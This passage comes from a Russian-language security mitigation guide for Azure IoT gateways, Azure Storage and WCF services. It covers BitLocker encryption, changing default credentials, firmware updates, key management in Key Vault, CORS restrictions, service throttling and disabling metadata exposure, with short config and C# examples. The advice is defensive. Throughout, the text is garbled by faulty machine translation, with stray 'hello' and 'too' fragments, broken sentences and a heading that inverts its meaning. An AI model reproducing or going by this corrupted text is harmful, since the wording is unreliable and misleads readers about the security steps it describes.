| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Windows 10 IoT базовая реализует это облегченная версия шифрование устройства Корзина бит, что имеет надежный зависимость от наличия hello доверенного платформенного модуля на платформе hello, включая протокол необходимые preOS hello в UEFI, который выполняет необходимые размеры hello. Этих измерений preOS убедитесь, что hello ОС позже имеется нормативное запись о том, как был запущен hello ОС. Шифрование ОС секций с помощью корзины бит и другие разделы также в случае, если они сохраняют все конфиденциальные данные. |

## <a id="default-change"></a>Убедитесь, что учетные данные входа по умолчанию hello шлюза поле hello изменены во время установки

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Полевой шлюз Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Убедитесь, что учетные данные входа по умолчанию hello шлюза поле hello изменены во время установки |

## <a id="cloud-firmware"></a>Убедитесь, что этот шлюз облака hello реализует процесс tookeep hello подключенных устройств встроенное по копии toodate

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Облачный шлюз Интернета вещей | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Выбор шлюза: Центр Интернета вещей Azure |
| **Справочные материалы**              | [Общие сведения об управлении устройствами концентратора IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [как tooupdate микропрограммы устройства](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Действия** | LWM2M — это протокол из hello Open Mobile Alliance для управления устройствами IoT. Управление устройствами Azure IoT позволяет toointeract физическими устройствами с помощью задания устройства. Убедитесь, что этот шлюз облака hello реализует keep hello процесса tooroutinely устройства и другие конфигурационные данные копии toodate концентратора IoT Azure возможности управления устройствами. |

## <a id="controls-policies"></a>Настройте элементы управления безопасностью конечных точек устройства в соответствии с политиками организации

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Отношения доверия между компьютерами | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Убедитесь, что на устройстве настроены элементы управления безопасностью конечных точек, например шифрование BitLocker, выполняемое на уровне дисков, антивирусная программа с обновленными подписями, брандмауэр на основе узла, обновления операционной системы, групповые политики и т. д., в соответствии с политиками безопасности организации. |

## <a id="secure-keys"></a>Обеспечьте безопасное управление ключами доступа к хранилищу Azure

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Хранилище Azure | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Руководство по безопасности службы хранилища Azure. Управление ключами учетной записи хранения](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Действия** | <p>Хранилища ключей: Рекомендуется использовать клавиши доступа toostore hello хранилища Azure в хранилище ключей Azure как секрет и приложения hello получить hello ключ из хранилища ключей. Это рекомендуется из-за toohello следующих причин:</p><ul><li>приложения Hello никогда не будет hello, ключа хранилища жестко задано в файле конфигурации, удаляющий пути, кто-то получение ключей toohello без определенного разрешения доступа</li><li>Ключи доступа toohello можно управлять с помощью Azure Active Directory. Это означает, что владелец учетной записи можно предоставить доступ toohello несколько приложений, которые должны tooretrieve hello ключи из хранилища ключей Azure. Другие приложения не будет возможности tooaccess hello ключи не предоставляя им разрешений специально</li><li>Повторное создание ключа: Рекомендуется toohave процесса в месте tooregenerate для доступа к хранилищу Azure ключи по соображениям безопасности. Сведения о том, почему и как tooplan для повторного создания ключа описаны в hello руководства по безопасности хранилища Azure ссылаются статьи</li></ul>|

## <a id="cors-storage"></a>Настройте доступ к службе хранилища Azure с включенной технологией CORS только из доверенных источников

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Хранилище Azure | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Поддержка CORS для служб хранилища Azure hello](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Действия** | Хранилище Azure позволяет tooenable CORS — Cross источника общий доступ к ресурсам. Для каждой учетной записи хранения можно указать домены, которые могут обращаться к ресурсам hello этой учетной записи хранения. По умолчанию механизм CORS отключен для всех служб. CORS можно включить с помощью hello API-интерфейса REST или hello хранилища клиента библиотеки toocall один из политики службы hello tooset методы hello. |

## <a id="throttling"></a>Включите компонент регулирования служб WCF

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | WCF | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | .NET Framework 3 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Действия** | <p>Не hello установки предела использования системных ресурсов может привести к исчерпанию ресурсов и в конечном счете отказ в обслуживании.</p><ul><li>**Описание:** запросов на обслуживание toothrottle hello возможности предоставляет Windows Communication Foundation (WCF). Слишком большое количество клиентских запросов может привести к переполнению системы, в результате чего ее ресурсы могут исчерпаться. На hello другой стороны, позволяя только небольшое количество запросов службы tooa можно запретить использование службы hello законных пользователей. Каждой службы должно быть индивидуально настраиваемых tooand настроен tooallow hello соответствующий объем ресурсов.</li><li>**Рекомендации.** Включите функцию регулирования служб WCF и задайте ограничения, соответствующие вашему приложению.</li></ul>|

### <a name="example"></a>Пример
Hello ниже приведен пример конфигурации с регулированием включена.
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Применяйте раскрытие информации через метаданные, переданные WCF

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | WCF | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | .NET Framework 3 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Действия** | Метаданные могут помочь злоумышленникам Дополнительные сведения о системе hello и планирование форму атаки. Службы WCF может быть настроенный tooexpose метаданных. В этих метаданных содержится подробное описание службы, и поэтому их не следует передавать в рабочих средах. Hello `HttpGetEnabled`  /  `HttpsGetEnabled` свойства класса ServiceMetaData hello определяет, будет ли служба предоставлять метаданные hello | 

### <a name="example"></a>Пример
Приведенный ниже код Hello указывает, что WCF toobroadcast метаданных службы
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Не передавайте метаданные службы в рабочей среде. Задайте параметр HttpGetEnabled hello / HttpsGetEnabled свойства hello ServiceMetaData классов toofalse. 

### <a name="example"></a>Пример
ниже примере кода Hello указывает, что WCF toonot широковещательных метаданных службы. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
